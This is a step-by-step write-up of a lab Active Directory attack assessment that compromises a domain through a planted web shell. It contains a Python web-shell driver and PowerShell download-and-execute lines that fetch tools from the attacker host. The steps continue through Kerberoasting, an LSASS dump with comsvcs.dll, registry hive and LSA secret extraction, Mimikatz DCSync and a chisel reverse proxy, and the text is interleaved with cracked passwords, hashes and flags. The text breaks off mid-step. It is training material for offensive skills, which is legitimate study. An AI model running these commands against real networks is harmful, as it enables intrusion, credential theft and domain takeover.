# Section 34 — AD Enumeration & Attacks Skills Assessment Part I

> Scenario: a teammate left an Antak ASPX web shell on an external-facing web server. Pivot through the web server, compromise AD, and capture three flags.
> Web shell creds: `admin:My_W3bsH3ll_P@ssw0rd!`
> Target: external web server (HTB-spawned IP, e.g., 10.129.202.242)

---

## Attack Chain Overview

```
Web shell (Antak)   →   svc_sql (Kerberoast + crack)
        ↓                       ↓
NT AUTHORITY\SYSTEM    Admin on MS01
on WEB-WIN01                    ↓
                       LSASS + LSA Secrets dump
                                ↓
                       tpetty:Sup3rS3cur3D0m@inU2eR
                       (DefaultPassword in LSA secrets)
                                ↓
                       tpetty has DCSync rights
                                ↓
                       Mimikatz DCSync /authuser:tpetty
                                ↓
                       Administrator NTLM hash
                                ↓
                       Chisel SOCKS proxy
                                ↓
                       wmiexec.py PTH → DC01 flag
```

---

## Lab Answers

| Q | Question | Answer |
|---|----------|--------|
| 1 | Flag on web server Administrator Desktop | `JusT_g3tt1ng_st@rt3d!` |
| 2 | Account name for SPN `MSSQLSvc/SQL01.inlanefreight.local:1433` | `svc_sql` |
| 3 | Cracked password for that account | `lucky7` |
| 4 | Flag on MS01 Administrator Desktop | `spn$_r0ast1ng_on_@n_0p3n_f1re` |
| 5 | Another domain user with cleartext creds | `tpetty` |
| 6 | Their cleartext password | `Sup3rS3cur3D0m@inU2eR` |
| 7 | Attack this user can perform | `DCSync` |
| 8 | Flag on DC01 Administrator Desktop | `r3plicat1on_m@st3r!` |

---

## Phase 0 — Setup Attack Host

```bash
ip -brief a show tun0
# Get the Kali tun0 IP — we'll need this to serve files and receive callbacks
# Result: 10.10.17.176/23
```
> Gets your VPN interface IP address. You need this for serving files and receiving callbacks from the target. Replace `tun0` with whatever interface name your VPN uses.

```bash
mkdir -p ~/assessment34
# Working directory for all artifacts collected during the assessment
```
> Creates a dedicated working directory to store hashes, dumps, and other artifacts collected during the assessment.

```bash
cd ~/Downloads && python3 -m http.server 80 &
# HTTP server on port 80 — used to serve tools to the target via PowerShell iwr
# Port 80 chosen because it's commonly allowed outbound through firewalls
# Backgrounded with & — runs detached so we can keep working
```
> Starts a simple HTTP file server on port 80. The target host can fetch tools from this server using `iwr` or `Invoke-WebRequest`. Port 80 is used because most firewalls allow it outbound. The `&` backgrounds the process so the terminal stays free.

---

## Phase 1 — Web Shell Access (Q1)

### Step 1.1 — Verify web shell is reachable

```bash
curl -s -o /dev/null -w "%{http_code}" http://10.129.202.242/
curl -s -o /dev/null -w "%{http_code}" http://10.129.202.242/uploads/
# -s = silent (no progress bar)
# -o /dev/null = discard response body — we only care about status
# -w "%{http_code}" = print just the HTTP status code
# Result: 200 200 (both root and /uploads/ are accessible)
```
> Quick HTTP status checks to confirm the web server and the uploads directory are reachable before proceeding. Replace the IP with your target.

```bash
curl -s http://10.129.202.242/uploads/ | grep -i -E "\.aspx|\.php|shell|href"
# Look for the web shell file in the directory listing
# Result: antak.aspx, web.config
# antak.aspx = Antak PowerShell-based ASPX web shell from Nishang
```
> Fetches the uploads directory listing and filters for web shell filenames. Greps for `.aspx`, `.php`, `shell`, and links to quickly identify any accessible shells without reading the full page.

### Step 1.2 — Build an Antak shell helper

Antak is form-based and uses ASP.NET ViewState. It does not use session cookies. Every command requires you to re-post the ViewState token from the previous response. The login form accepts URL-encoded POST data. We build a Python helper to handle this automatically.

```python
# /tmp/antak_helper.py (the full inline version used in the assessment)
import requests, re

URL = 'http://10.129.202.242/uploads/antak.aspx'
s = requests.Session()

def gt(h):
    """Extract __VIEWSTATE, __VIEWSTATEGENERATOR, __EVENTVALIDATION from page HTML"""
    t = {}
    for f in ['__VIEWSTATE','__VIEWSTATEGENERATOR','__EVENTVALIDATION']:
        m = re.search(rf'id="{f}"[^>]*value="([^"]+)"', h)
        if m: t[f] = m.group(1)
    return t

# Login flow:
r = s.get(URL)                                              # GET page to retrieve tokens
tokens = gt(r.text)
r = s.post(URL, data={**tokens,
                       'Username': 'admin',
                       'Password': 'My_W3bsH3ll_P@ssw0rd!',
                       'Login': 'Login'})                   # Submit login
current_tokens = gt(r.text)                                 # New tokens from logged-in page

def run(cmd):
    """Execute a PowerShell command in Antak and return stdout."""
    global current_tokens
    data = {**current_tokens,
            'console': cmd,
            'cmd': 'Submit',
            'sqlconnectiostr': 'x'}                         # sqlconnectiostr is required field
    r = s.post(URL, data=data)
    current_tokens = gt(r.text)                             # Refresh tokens for next call
    # Parse output from the <textarea name="output"> block
    m = re.search(r'<textarea[^>]*name="output"[^>]*>(.*?)</textarea>', r.text, re.DOTALL)
    if m:
        # The last 'PS>' marker indicates start of fresh output
        parts = m.group(1).split('PS&gt;')
        return parts[-1].strip().replace('&gt;','>').replace('&lt;','<').replace('&amp;','&').replace('&#39;',"'").replace('&quot;','"')
    return 'NO OUTPUT'
```

**Key gotcha — double quotes get stripped:** Antak's `console` field forwards content to PowerShell with whitespace tokenization. Use single quotes for any string with spaces. This bit us on `IEX (New-Object Net.WebClient).DownloadString("URL")` until we switched to single quotes.

### Step 1.3 — Confirm code execution

```powershell
whoami
# Result: nt authority\system
# We're running as SYSTEM via the IIS App Pool — best possible local context
```
> Confirms the security context of the web shell. `nt authority\system` means the IIS application pool is running as SYSTEM — full local access with no privilege escalation needed.

### Step 1.4 — Read the web server flag (Q1)

```powershell
type C:\Users\Administrator\Desktop\flag.txt
# Result: JusT_g3tt1ng_st@rt3d!  ← Q1 answer
```
> Reads the flag file from the Administrator's desktop. Replace the path with the flag location on your target.

### Step 1.5 — Profile the host

```powershell
hostname
# Result: WEB-WIN01

ipconfig /all | Select-String 'IPv4|Host'
# Result:
#   Host Name: WEB-WIN01
#   IPv4 Address: 172.16.6.100   ← internal network IP
#   IPv4 Address: 10.129.202.242 ← external/lab network IP
# WEB-WIN01 is dual-homed: external (10.129.x.x) and internal (172.16.6.0/16)
```
> Identifies the host and its network interfaces. Dual-homed hosts (one external IP, one internal IP) are pivot points into the internal network.

```powershell
(Get-WmiObject Win32_ComputerSystem).Domain
# Result: INLANEFREIGHT.LOCAL
# Domain-joined — we can use the machine account for AD queries
```
> Confirms the host is domain-joined. A domain-joined machine can make LDAP queries using its machine account (HOSTNAME$) even without human user credentials.

```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers | select Name,IPAddress
# Result: DC01.INLANEFREIGHT.LOCAL  172.16.6.3
# DC is at 172.16.6.3 — only reachable from inside the network
```
> Discovers all Domain Controllers (DCs) and their IP addresses using the .NET `DirectoryServices` library. No imports needed — works with the machine account context.

---

## Phase 2 — Kerberoasting (Q2 + Q3)

### Step 2.1 — Find the user behind the SPN (Q2)

```powershell
$Searcher = New-Object DirectoryServices.DirectorySearcher
$Searcher.Filter = '(servicePrincipalName=MSSQLSvc/SQL01.inlanefreight.local:1433)'
$Result = $Searcher.FindAll()
foreach ($r in $Result) { $r.Properties.samaccountname; $r.Properties.serviceprincipalname }
# DirectorySearcher uses the current machine context (WEB-WIN01$) to query LDAP
# Filter: (servicePrincipalName=...) finds exact SPN match
# Result:
#   svc_sql                                              ← Q2 answer
#   MSSQLSvc/SQL01.inlanefreight.local:1433
```
> Queries Active Directory (AD) for the user account that owns a specific Service Principal Name (SPN). `DirectorySearcher` uses the machine account context so it works without importing PowerView or Rubeus. Replace the SPN value in the filter with your target SPN.

### Step 2.2 — Stage Invoke-Kerberoast on Kali

```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1 ~/Downloads/
ls ~/Downloads/Invoke-Kerberoast.ps1
# Invoke-Kerberoast.ps1 = PowerShell port of Rubeus Kerberoasting
# We serve this via our Python HTTP server so the target can IEX-download it
# Reason: we don't have Rubeus.exe staged, and PowerShell-only avoids dropping a binary
```
> Stages the Invoke-Kerberoast script in the HTTP server directory. The target will download and execute it entirely in memory — no binary dropped to disk. The script is bundled with PowerShell Empire on Kali.

### Step 2.3 — Run Invoke-Kerberoast through the web shell

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.17.176/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat -Identity svc_sql -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Hash
# IEX = Invoke-Expression — execute the downloaded PS1 in memory (no disk drop)
# New-Object Net.WebClient = simple HTTP client built into .NET
# .DownloadString() = fetch URL content as a string
# Note SINGLE QUOTES around the URL — double quotes get stripped by Antak's tokenizer
# Invoke-Kerberoast:
#   -OutputFormat Hashcat = produce $krb5tgs$23$ format ready for hashcat -m 13100
#   -Identity svc_sql = target only this user (less noise than full domain scan)
#   -ErrorAction SilentlyContinue = suppress errors for accounts we can't roast
#   | Select-Object -ExpandProperty Hash = strip metadata, output just the hash blob
# Result: $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$EC51...
```
> Downloads and executes Invoke-Kerberoast in memory, then requests a TGS ticket for the target account and outputs it in hashcat format. Use single quotes around the URL when running through Antak — double quotes get stripped by the shell tokenizer.

### Step 2.4 — Crack the hash on Kali (Q3)

```bash
# Save the hash from the web shell output into a file
cat > ~/assessment34/svc_sql.hash << 'EOF'
$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$EC51...
EOF

# Sanity-check hash integrity BEFORE running hashcat
python3 -c "h=open('/home/victus/assessment34/svc_sql.hash').read().strip(); blob=h.split('*\$')[-1].split('\$')[1] if '*\$' in h else h.split('\$')[-1]; print('hash len:', len(blob), 'even:', len(blob)%2==0)"
# Reason: A hash with an odd number of hex chars = corrupted (truncated by 1 char)
# Hashcat will silently exhaust the wordlist without cracking — this check saves hours
# Result: hash len: 2160, even: True ✓
```
> Saves the TGS hash to a file, then runs a quick sanity check to confirm the hash is not corrupted. A hash with an odd number of hex characters was truncated during copy-paste and will silently fail to crack — always verify before spending time in hashcat.

```bash
hashcat -m 13100 ~/assessment34/svc_sql.hash /usr/share/wordlists/rockyou.txt -O
# -m 13100 = Kerberos 5 TGS-REP etype 23 (RC4-HMAC)
# rockyou.txt = standard wordlist, ~14M entries
# -O = optimized kernel — much faster, caps at 31-char passwords (fine for service accounts)
# Result: svc_sql:lucky7  ← Q3 answer (cracked in <2 seconds)
```
> Cracks the Kerberos TGS hash using the rockyou wordlist. `-m 13100` is the correct mode for Kerberos 5 TGS-REP (RC4-HMAC). `-O` enables the optimized kernel for significantly faster cracking.

---

## Phase 3 — Pivot to MS01 (Q4)

### Step 3.1 — Resolve MS01's IP

```powershell
Resolve-DnsName MS01.INLANEFREIGHT.LOCAL -Type A | select Name,IPAddress
# Resolve-DnsName = built-in PowerShell DNS resolver
# -Type A = IPv4 records only
# Result: MS01.INLANEFREIGHT.LOCAL  172.16.6.50
```

### Step 3.2 — Test if svc_sql can access MS01

```powershell
$pw = ConvertTo-SecureString 'lucky7' -AsPlainText -Force
$cred = New-Object PSCredential('INLANEFREIGHT\svc_sql', $pw)
Invoke-Command -ComputerName MS01.INLANEFREIGHT.LOCAL -Credential $cred -ScriptBlock { hostname; whoami; Get-Content C:\Users\Administrator\Desktop\flag.txt -ErrorAction SilentlyContinue }
# ConvertTo-SecureString -AsPlainText -Force = wrap plain password in SecureString (required by PSCredential)
# PSCredential = standard Windows credential object for cross-machine auth
# Invoke-Command -ComputerName ... -Credential ... = run PSRemoting over WinRM (port 5985)
# Script block: hostname (confirm target), whoami (confirm we're svc_sql there),
#               Get-Content flag.txt (read flag if we have admin)
# Results:
#   MS01
#   inlanefreight\svc_sql
#   spn$_r0ast1ng_on_@n_0p3n_f1re   ← Q4 answer
# svc_sql is a local admin on MS01 — likely a misconfigured service account
```

---

## Phase 4 — LSASS Dump on MS01 (start of Q5/Q6 chain)

The standard approach: dump the Local Security Authority Subsystem Service (LSASS) process via `comsvcs.dll MiniDump`, transfer the dump file, then parse it offline with pypykatz.

### Step 4.1 — Get LSASS PID and dump it

```powershell
$pw = ConvertTo-SecureString 'lucky7' -AsPlainText -Force
$cred = New-Object PSCredential('INLANEFREIGHT\svc_sql', $pw)
Invoke-Command -ComputerName MS01.INLANEFREIGHT.LOCAL -Credential $cred -ScriptBlock {
    $p = Get-Process lsass
    cmd /c "rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $($p.Id) C:\Windows\Temp\lsass.dmp full"
    Start-Sleep 3
    Get-Item C:\Windows\Temp\lsass.dmp
}
# Get-Process lsass = retrieves the LSASS process object (LSASS holds credential material)
# comsvcs.dll = Microsoft-signed DLL with an exported MiniDump function
#   Why this and not Mimikatz? comsvcs.dll is built-in and signed — bypasses many AVs
# cmd /c "..." = wrap in cmd.exe because rundll32 expects positional args and PS variable
#                expansion in remoting sessions is brittle (we hit a parser error initially)
# $($p.Id) = subexpression operator — embeds the LSASS PID as a string
# "full" = include full memory dump (required for password material)
# Start-Sleep 3 = give the dump 3s to flush to disk
# Result: lsass.dmp ~46 MB written to C:\Windows\Temp\
```
> Dumps the LSASS process from MS01 using `comsvcs.dll`. This avoids dropping Mimikatz on disk — `comsvcs.dll` is Microsoft-signed and bypasses many antivirus (AV) products. `Start-Sleep 3` gives the dump time to flush before checking for the file.

### Step 4.2 — Copy the dump from MS01 → WEB-WIN01

```powershell
$pw = ConvertTo-SecureString 'lucky7' -AsPlainText -Force
$cred = New-Object PSCredential('INLANEFREIGHT\svc_sql', $pw)
New-PSDrive -Name MS -PSProvider FileSystem -Root \\MS01.INLANEFREIGHT.LOCAL\C$ -Credential $cred | Out-Null
Copy-Item MS:\Windows\Temp\lsass.dmp C:\Windows\Temp\lsass.dmp
Remove-PSDrive MS
Get-Item C:\Windows\Temp\lsass.dmp
# New-PSDrive = mount the remote admin share (C$) as a local PSDrive named MS
#   Why: Copy-Item can then use MS:\... paths just like a local drive
# Out-Null = suppress the noisy "drive created" output
# Copy-Item MS:\... = pulls the dump back to WEB-WIN01 over SMB (port 445)
# Remove-PSDrive MS = clean up the mount
# Result: 45,924,709 bytes copied to C:\Windows\Temp\lsass.dmp on WEB-WIN01
```
> Mounts MS01's C: drive as a local PowerShell drive and pulls the dump file over Server Message Block (SMB). `New-PSDrive` is cleaner than UNC paths in remoting sessions. `Remove-PSDrive` cleans up the mount when done.

### Step 4.3 — Stage the dump in the web root and download to Kali

```powershell
Copy-Item C:\Windows\Temp\lsass.dmp C:\inetpub\wwwroot\uploads\lsass.dmp
# Copy into the IIS web root so we can fetch it via HTTP
# Initially used .dmp extension — got HTTP 404 because IIS blocks .dmp by default

# Workaround: rename to a whitelisted extension
Rename-Item C:\inetpub\wwwroot\uploads\lsass.dmp lsass.txt
# .txt is served as text/plain — IIS allows the download
# Result: 45 MB file accessible at /uploads/lsass.txt
```
> Copies the dump into the Internet Information Services (IIS) web root so Kali can download it. The `.dmp` extension returns a 404 because IIS blocks it by default. Renaming to `.txt` bypasses the block.

```bash
curl -s -o ~/assessment34/lsass.dmp http://10.129.202.242/uploads/lsass.txt
file ~/assessment34/lsass.dmp
# file command verifies we got a valid dump file
# Result: Mini DuMP crash report, 13 streams, ... 0x6 type  ✓
```
> Downloads the dump to Kali and confirms it is a valid minidump. The `file` command reads the file header — a valid dump shows "Mini DuMP crash report."

### Step 4.4 — Parse with pypykatz

```bash
pypykatz lsa minidump ~/assessment34/lsass.dmp 2>&1 | grep -B 1 -A 20 "tpetty"
# pypykatz = Python re-implementation of Mimikatz that parses LSASS dumps offline
#   Why offline: avoids running Mimikatz on the target (AV detection)
# lsa minidump = parse a minidump file (not a live LSASS)
# grep -B 1 -A 20 = show 1 line before and 20 after each "tpetty" match
# Result:
#   == MSV ==
#     Username: tpetty
#     Domain: INLANEFREIGHT
#     NT: fd37b6fec5704cadabb319cebf9e3a3a   ← tpetty's NTLM hash
#     SHA1: 38afea42a5e28220474839558f073979645a1192
#   == WDIGEST ==
#     password None  ← WDigest disabled, no plaintext from here
#   == Kerberos ==
#     AES128 Key: fd37b6fec5704cadabb319cebf9e3a3a
#     AES256 Key: f6582e6ef03b4d1a5017da414d4bddb469b66b006c66380f66654bd4be28f634
```
> Parses the LSASS minidump offline with pypykatz. This avoids running Mimikatz on the target, which most antivirus products detect. The NT hash for tpetty appears in the MSV section.

```bash
# Try to crack tpetty's NTLM hash with rockyou — first attempt to get cleartext
echo "fd37b6fec5704cadabb319cebf9e3a3a" > ~/assessment34/tpetty.ntlm
hashcat -m 1000 ~/assessment34/tpetty.ntlm /usr/share/wordlists/rockyou.txt -O
# -m 1000 = NTLM hash mode
# Result: Status: Exhausted — password is NOT in rockyou
# Pivot to looking for plaintext elsewhere (LSA Secrets is the next stop)
```
> Attempts to crack tpetty's NTLM hash with rockyou. `-m 1000` is NTLM mode. The hash is not in rockyou, so we move on to extracting plaintext from LSA Secrets instead.

---

## Phase 5 — LSA Secrets Dump (Q5 + Q6)

The LSASS dump did not reveal tpetty's cleartext password. The next place to look is **LSA Secrets** in the SECURITY registry hive. This stores auto-logon passwords, service account passwords, and Data Protection API (DPAPI) keys.

### Step 5.1 — Save SAM/SYSTEM/SECURITY hives on MS01

```powershell
$pw = ConvertTo-SecureString 'lucky7' -AsPlainText -Force
$cred = New-Object PSCredential('INLANEFREIGHT\svc_sql', $pw)
Invoke-Command -ComputerName MS01.INLANEFREIGHT.LOCAL -Credential $cred -ScriptBlock {
    cmd /c 'reg save HKLM\SAM C:\Windows\Temp\sam.hive /y'
    cmd /c 'reg save HKLM\SYSTEM C:\Windows\Temp\system.hive /y'
    cmd /c 'reg save HKLM\SECURITY C:\Windows\Temp\security.hive /y'
    Get-ChildItem C:\Windows\Temp\*.hive
}
# reg save HKLM\SAM = dump local SAM database (local account hashes)
# reg save HKLM\SYSTEM = needed for SYSKEY (decrypts other hives)
# reg save HKLM\SECURITY = LSA Secrets, Cached Credentials, DPAPI master keys
# /y = overwrite without prompting
# Why all three: secretsdump.py needs SYSTEM (for boot key) + SAM/SECURITY to decrypt
# Result: 3 .hive files in C:\Windows\Temp on MS01
```
> Saves the three registry hives to disk on MS01. The SYSTEM hive contains the SYSKEY used to decrypt the others. You need all three for `secretsdump.py` to parse LSA Secrets offline.

### Step 5.2 — Copy hives to Kali (same path as LSASS dump)

```powershell
$pw = ConvertTo-SecureString 'lucky7' -AsPlainText -Force
$cred = New-Object PSCredential('INLANEFREIGHT\svc_sql', $pw)
New-PSDrive -Name MSX -PSProvider FileSystem -Root \\MS01.INLANEFREIGHT.LOCAL\C$ -Credential $cred | Out-Null
Copy-Item MSX:\Windows\Temp\sam.hive C:\inetpub\wwwroot\uploads\sam.txt
Copy-Item MSX:\Windows\Temp\system.hive C:\inetpub\wwwroot\uploads\system.txt
Copy-Item MSX:\Windows\Temp\security.hive C:\inetpub\wwwroot\uploads\security.txt
Remove-PSDrive MSX
# Same staging pattern: SMB pull → IIS web root → .txt extension to bypass IIS blocks
```
> Copies all three hive files from MS01 to the IIS web root using the same SMB/IIS staging trick from the LSASS dump. Rename each to `.txt` so IIS will serve them for download.

```bash
for h in sam system security; do
    curl -s -o ~/assessment34/$h.hive http://10.129.202.242/uploads/$h.txt
    echo "$h: $(ls -la ~/assessment34/$h.hive | awk '{print $5}') bytes"
done
# Loop downloads all three hives, renames .txt → .hive for clarity
# Results:
#   sam: 53248 bytes
#   system: 16064512 bytes  (~16 MB, registry can be big)
#   security: 45056 bytes
```
> Downloads all three hive files to Kali in a loop and prints each file size to confirm the transfer completed.

### Step 5.3 — Parse hives with secretsdump.py

```bash
cd ~/assessment34 && secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL
# secretsdump.py LOCAL mode = parse from hive files offline (no network)
# -sam, -system, -security = the three saved hives
# LOCAL = positional arg telling secretsdump these are offline hives
```
> Parses all three hives offline. `LOCAL` tells secretsdump to read from files instead of connecting to a remote host. The SYSTEM hive provides the decryption key for the SAM and SECURITY hives.

**Critical output:**
```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
  (Local MS01 Administrator NTLM — useful for lateral movement to OTHER hosts)

[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801
INLANEFREIGHT.LOCAL/svc_sql:$DCC2$10240#svc_sql#acc5441d637ce6aabf3a3d9d4f8137fb
INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245
  (MS-Cache v2 hashes — confirms these users have logged into MS01)

[*] Dumping LSA Secrets
[*] DefaultPassword
(Unknown User):Sup3rS3cur3D0m@inU2eR    ← Q6 answer (cleartext!)
```

**Why this is the winning find:** `DefaultPassword` is an LSA secret used by Windows AutoLogon. When `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoAdminLogon = 1`, the password for `DefaultUserName` is stored here in plaintext (encrypted with the SYSKEY only). We extracted SYSKEY via the SYSTEM hive, so secretsdump decrypted it.

### Step 5.4 — Confirm which user the AutoLogon belongs to (Q5)

```powershell
$pw = ConvertTo-SecureString 'lucky7' -AsPlainText -Force
$cred = New-Object PSCredential('INLANEFREIGHT\svc_sql', $pw)
Invoke-Command -ComputerName MS01.INLANEFREIGHT.LOCAL -Credential $cred -ScriptBlock {
    Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-Object DefaultUserName,DefaultDomainName,DefaultPassword,AutoAdminLogon
}
# Result:
#   DefaultUserName  : tpetty          ← Q5 answer
#   DefaultDomainName: INLANEFREIGHT
#   DefaultPassword  : <blank>          (Windows cleared the registry value; the secret is now in LSA)
#   AutoAdminLogon   : 1                (confirms AutoLogon is enabled)
```

So the LSA secret `DefaultPassword = Sup3rS3cur3D0m@inU2eR` belongs to the domain user `tpetty`.

---

## Phase 6 — Identify Attack Path for tpetty (Q7)

tpetty has no special group memberships (`whoami` only shows Domain Users). The privilege must come from an Access Control List (ACL) entry on a specific AD object.

### Step 6.1 — Check tpetty's group memberships first

```powershell
$Searcher = New-Object DirectoryServices.DirectorySearcher
$Searcher.Filter = '(samaccountname=tpetty)'
$Result = $Searcher.FindOne()
$user = $Result.GetDirectoryEntry()
$user.RefreshCache(@('tokenGroups'))
foreach ($sid in $user.tokenGroups) {
    $sidObj = New-Object System.Security.Principal.SecurityIdentifier($sid,0)
    try { $sidObj.Translate([System.Security.Principal.NTAccount]).Value } catch { $sidObj.Value }
}
# tokenGroups = all groups including nested (transitively resolved by AD)
# SecurityIdentifier.Translate() = SID → DOMAIN\groupname
# Result:
#   BUILTIN\Users
#   INLANEFREIGHT\Domain Users
# No special groups — privilege must be at the ACL level on a specific AD object
```
> Lists all of tpetty's group memberships including nested groups. The result only shows standard groups. That means the privilege comes from a Discretionary Access Control List (DACL) entry on an AD object, not from group membership.

### Step 6.2 — Stage PowerView and check ACLs

```bash
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 ~/Downloads/PowerView.ps1
# PowerView = comprehensive AD enumeration script
# Has Get-DomainObjectAcl which resolves DACL aces and shows ObjectAceType (GUIDs → names)
```
> Stages PowerView in the HTTP server directory so the target can download it in memory.

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.17.176/PowerView.ps1')
Get-DomainObjectAcl -Identity 'DC=INLANEFREIGHT,DC=LOCAL' -ResolveGUIDs | Where-Object { $_.SecurityIdentifier -eq (Get-DomainUser tpetty).objectsid } | Select-Object ObjectDN,ActiveDirectoryRights,ObjectAceType
# -Identity 'DC=INLANEFREIGHT,DC=LOCAL' = check ACLs on the DOMAIN ROOT object
#   This is where DCSync rights live — they're granted at the domain object level
# -ResolveGUIDs = translate the extended-right GUIDs into readable names
# Where-Object filter = only show ACEs where tpetty's SID is the principal
```
> Downloads PowerView in memory and checks ACLs on the domain root object. DCSync rights are granted at the domain root level. `-ResolveGUIDs` converts raw Global Unique Identifiers (GUIDs) into readable right names.

**Result:**
```
ObjectDN                  ActiveDirectoryRights ObjectAceType
--------                  --------------------- -------------
DC=INLANEFREIGHT,DC=LOCAL ExtendedRight         DS-Replication-Get-Changes-In-Filtered-Set
DC=INLANEFREIGHT,DC=LOCAL ExtendedRight         DS-Replication-Get-Changes
DC=INLANEFREIGHT,DC=LOCAL ExtendedRight         DS-Replication-Get-Changes-All
```

**These three Extended Rights together = DCSync capability.** ← Q7 answer

| Right | What It Allows |
|-------|---------------|
| DS-Replication-Get-Changes | Replicate non-secret object attributes |
| DS-Replication-Get-Changes-All | Replicate secret attributes (passwords/hashes) |
| DS-Replication-Get-Changes-In-Filtered-Set | Replicate filtered-set attributes (e.g., LAPS) |

Any user with the first two can perform DCSync to extract every account's hash. The third extends the attack to filtered attributes.

---

## Phase 7 — DCSync to Extract the Administrator Hash

### Step 7.1 — Stage Mimikatz on Kali

```bash
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ~/Downloads/
ls -la ~/Downloads/mimikatz.exe
# x64 version — the Win32 version fails on 64-bit Windows
# Result: 1,355,264 bytes (~1.3 MB)
```

### Step 7.2 — Download Mimikatz to the web server

```powershell
iwr http://10.10.17.176/mimikatz.exe -o C:\Windows\Temp\mk.exe
Get-Item C:\Windows\Temp\mk.exe
# iwr = Invoke-WebRequest, the modern PS HTTP downloader
# -o = output file path
# Renamed to mk.exe (less obvious than mimikatz.exe in process listings — minor opsec)
# Result: 1,355,264 bytes saved to C:\Windows\Temp\mk.exe
```

### Step 7.3 — DCSync with tpetty's credentials (the trick)

**Problem:** Our shell runs as the IIS AppPool with restricted privileges. `Start-Process -Credential` fails with "Access is denied." `runas` requires an interactive password prompt. Standard pass-the-hash via `sekurlsa::pth` also failed with a "Key import" error because Local Security Authority (LSA) Protection was enabled.

**Solution:** Mimikatz's `lsadump::dcsync` has built-in `/authuser` parameters that pass credentials directly to the Remote Procedure Call (RPC) connection. No token impersonation is needed.

```powershell
C:\Windows\Temp\mk.exe 'privilege::debug' 'lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\Administrator /authuser:tpetty /authdomain:INLANEFREIGHT /authpassword:Sup3rS3cur3D0m@inU2eR' 'exit'
# privilege::debug = request SeDebugPrivilege (required for many Mimikatz commands)
# lsadump::dcsync = the actual DCSync attack — speaks DRSUAPI to the DC
# /domain:INLANEFREIGHT.LOCAL = target domain to replicate from
# /user:INLANEFREIGHT\Administrator = which account to extract
# /authuser:tpetty             = authenticate the RPC connection AS this user
# /authdomain:INLANEFREIGHT    = tpetty's domain (NetBIOS form)
# /authpassword:Sup3rS3cur3D0m@inU2eR = tpetty's cleartext password (we have it from LSA secrets!)
# 'exit' = quit Mimikatz after the command (prevents interactive prompt hang)
```
> Runs DCSync using tpetty's credentials passed directly to the RPC layer via `/authuser`. This bypasses token impersonation entirely — the DC sees the RPC call as coming from tpetty, who has DS-Replication rights. The Administrator NTLM hash comes back in the output.

**Result:**
```
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\Administrator' will be the user account
[rpc] Username : tpetty                 ← RPC authenticated as tpetty
[rpc] Password : Sup3rS3cur3D0m@inU2eR

Object RDN           : Administrator
SAM Username         : Administrator
Object Relative ID   : 500

Credentials:
  Hash NTLM: 27dedb1dab4d8545c6e1c66fba077da0   ← Administrator's NTLM hash!

* Primary:Kerberos-Newer-Keys *
  aes256_hmac       (4096) : a76102a5617bffb1ea84ba0052767992823fd414697e81151f7de21bb41b1857
  aes128_hmac       (4096) : 69e27df2550c5c270eca1d8ce5c46230
```

**Why `/authuser` works while everything else failed:** DCSync is an RPC call to the Domain Controller (DC). The DC checks whether the RPC caller has DS-Replication rights. With `/authuser`, Mimikatz builds the RPC binding using tpetty's credentials directly. No Windows token impersonation is needed. This sidesteps LSA Protection and Credential Guard restrictions on local pass-the-hash.

---

## Phase 8 — Reach DC01 via SOCKS Proxy

We have the Administrator New Technology LAN Manager (NTLM) hash but Kali cannot reach `172.16.6.3` directly — it is on the internal subnet. We need a reverse SOCKS proxy tunneled through the web shell.

### Step 8.1 — Download chisel on Kali

```bash
cd /tmp && curl -sL -o /tmp/chisel.gz https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
gunzip -f chisel.gz && chmod +x chisel
./chisel --version
# chisel = lightweight HTTP-tunneled TCP proxy in a single static binary
# Linux build for Kali, Windows build for the target
# Result: 1.10.1
```
> Downloads the Linux version of chisel to Kali. Chisel is a single static binary that tunnels TCP connections over HTTP. It supports reverse SOCKS5 proxies, which lets the compromised host connect out to us.

```bash
cd /tmp && curl -sL -o /tmp/chisel_win.gz https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz
gunzip -f /tmp/chisel_win.gz
cp /tmp/chisel_win ~/Downloads/chisel.exe
# Get the Windows version too, place in HTTP server dir for the target to download
```
> Downloads the Windows version of chisel and copies it to the HTTP server directory so the target can download it.

### Step 8.2 — Start chisel server on Kali

```bash
~/Downloads/chisel server -p 8000 --reverse > /tmp/chisel.log 2>&1 &
# server = listen mode
# -p 8000 = bind to port 8000 (anything outbound-allowed from the target)
# --reverse = accept reverse-proxy requests (client sets up listeners on the server side)
# &> /tmp/chisel.log = capture all output to a log
# Backgrounded so we keep our terminal
# Server log: "Listening on http://0.0.0.0:8000"
```
> Starts the chisel server on Kali. `--reverse` allows the client (target) to open SOCKS listeners on the server (Kali). The server logs all connections to `/tmp/chisel.log`. Run this before deploying the client.

### Step 8.3 — Drop chisel on the target and connect it back

```powershell
iwr http://10.10.17.176/chisel.exe -o C:\Windows\Temp\chisel.exe
